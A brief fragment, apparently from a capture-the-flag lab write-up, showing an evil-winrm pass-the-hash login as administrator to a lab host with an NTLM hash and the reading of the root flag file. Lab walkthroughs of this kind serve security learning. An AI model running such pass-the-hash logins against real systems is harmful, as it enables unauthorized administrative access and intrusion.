```
```sh
└─$ evil-winrm -i 10.129.80.180 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
b5a13a12aae3171df977e2c051d44261
```
